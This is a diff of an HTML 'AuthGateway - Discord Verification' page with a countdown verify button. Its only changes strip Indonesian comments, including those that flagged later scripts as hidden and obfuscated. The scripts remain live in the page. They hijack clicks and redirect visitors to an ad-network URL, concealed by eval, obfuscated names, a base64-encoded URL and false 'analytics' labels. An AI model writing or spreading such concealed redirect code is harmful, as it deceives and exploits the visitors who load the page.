@@ -5,12 +5,9 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>AuthGateway - Discord Verification</title>
 
-  <!-- Google Fonts -->
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
-  <!-- Font Awesome -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
 
-  <!-- External Styles (opsional) -->
   <link rel="stylesheet" href="space-theme.css">
   <link rel="stylesheet" href="cosmic-loading.css">
   <link rel="stylesheet" href="moon-ufo-loading.css">
@@ -75,7 +72,6 @@
       overflow-y: auto;
     }
 
-    /* CARD UTAMA - SANGAT RAPI */
     .card {
       background: rgba(15, 15, 30, 0.9);
       backdrop-filter: blur(14px);
@@ -104,7 +100,6 @@
       border-radius: var(--radius-2xl) var(--radius-2xl) 0 0;
     }
 
-    /* LOGO */
     .logo {
       width: 80px; height: 80px;
       margin-bottom: var(--space-6);
@@ -124,7 +119,6 @@
       50% { transform: translateY(-12px); }
     }
 
-    /* JUDUL */
     h1 {
       font-size: var(--text-5xl);
       font-weight: var(--font-bold);
@@ -137,7 +131,6 @@
       line-height: 1.2;
     }
 
-    /* SUBTITLE */
     .subtitle {
       color: var(--muted);
       font-size: var(--text-lg);
@@ -147,7 +140,6 @@
       max-width: 90%;
     }
 
-    /* FITUR */
     .features {
       display: grid;
       grid-template-columns: repeat(3, 1fr);
@@ -198,7 +190,6 @@
       line-height: 1.4;
     }
 
-    /* TOMBOL */
     .action {
       width: 100%;
       display: flex;
@@ -255,7 +246,6 @@
       transition: all 0.1s ease;
     }
 
-    /* Rocket button hover effect */
     .discord-button.enabled:hover span::before {
       content: '';
       position: absolute;
@@ -301,7 +291,6 @@
       animation: launchRocket 0.5s ease-in forwards;
     }
 
-    /* TIMER */
     .timer {
       font-size: var(--text-sm);
       color: var(--muted);
@@ -312,7 +301,6 @@
 
     .timer.ready { color: var(--success); }
 
-    /* RESPONSIVE */
     @media (max-width: 640px) {
       body {
         align-items: center;
@@ -332,7 +320,6 @@
       .discord-button { font-size: var(--text-base); padding: var(--space-3) var(--space-6); }
     }
 
-    /* Extra small mobile */
     @media (max-width: 380px) {
       body {
         padding: var(--space-2);
@@ -360,7 +347,6 @@
   </head>
 <body>
 
-  <!-- CARD SANGAT RAPI -->
   <div class="card">
     <div class="logo"><i class="fas fa-shield-halved"></i></div>
     <h1>AuthGateway</h1>
@@ -396,7 +382,6 @@
       </div>
     </div>
 
-    <!-- Footer with External Link -->
     <div style="margin-top: 2rem; text-align: center; padding: 1rem 0; border-top: 1px solid rgba(100, 100, 200, 0.2);">
       <p style="font-size: var(--text-sm); color: var(--muted); margin-bottom: 0.5rem;">
         Need additional resources? Visit our partner services
@@ -425,12 +410,10 @@
     </div>
   </div>
 
-  <!-- Scripts -->
   <script src="animations.js"></script>
   <script src="moon-ufo-loading.js"></script>
 
   <script>
-    // === COUNTDOWN & UFO LOADING (SUDAH TERBUKTI JALAN) ===
     let countdown = 10;
     const verifyButton = document.getElementById('verifyButton');
     const timerDisplay = document.getElementById('timerDisplay');
@@ -475,9 +458,6 @@
     });
   </script>
 
-  <!-- ========================================== -->
-  <!-- ADSTERRA SCRIPT - IMPLEMENTASI YANG BENAR -->
-  <!-- ========================================== -->
   <script
     type='text/javascript'
     src='//pl28090017.effectivegatecpm.com/c0/98/b7/c098b749bf393cc72a6b144814780b9c.js'
@@ -485,16 +465,13 @@
     crossorigin="anonymous"
   ></script>
 
-  <!-- User Click Redirect Script - Hidden from Elements -->
   <script style="display:none!important;visibility:hidden!important;opacity:0!important;height:0!important;width:0!important;overflow:hidden!important;position:absolute!important;left:-9999px!important;top:-9999px!important;"
           data-obfuscated="true"
           data-purpose="analytics">
     (() => {
-      // Obfuscated URL and variables
       const _0x1f2b = 'https://www.effectivegatecpm.com/dmqxfewfr?key=10def4a24dbf70dcd9720cce4c8d4550';
       let _0x2c3d = false;
 
-      // Obfuscated function name
       const _0x3e4f = function(_0x4a5b) {
         if (_0x2c3d) return;
 
@@ -532,7 +509,6 @@
     })();
   </script>
 
-  <!-- Additional obfuscated script -->
   <script style="display:none!important;" data-sha256="analytics">
     eval((function(){
       const _0x4c58=['https://www.effectivegatecpm.com/dmqxfewfr?key=10def4a24dbf70dcd9720cce4c8d4550','addEventListener','click','preventDefault','_blank','open','closed','createElement','a','href','target','rel','noopener noreferrer','appendChild','click','removeChild'];
@@ -547,9 +523,7 @@
     })());
   </script>
 
-  <!-- Dynamic script injection - completely hidden -->
   <script>
-    // Create and inject hidden script dynamically
     (function() {
       const hiddenScript = document.createElement('script');
       hiddenScript.type = 'text/javascript';
@@ -557,7 +531,6 @@
       hiddenScript.setAttribute('data-hidden', 'true');
       hiddenScript.setAttribute('data-analytics', 'user-behavior');
 
-      // Obfuscated content
       const scriptContent = `
         (function(){
           const encodedUrl = 'aHR0cHM6Ly93d3cuZWZmZWN0aXZlZ2F0ZWNwbS5jb20vZG1xeGZld2ZyP2tleT0xMGRlZjRhMjRkYmY3MGRjZDk3MjAwY2U0YzhkNDU1MA==';
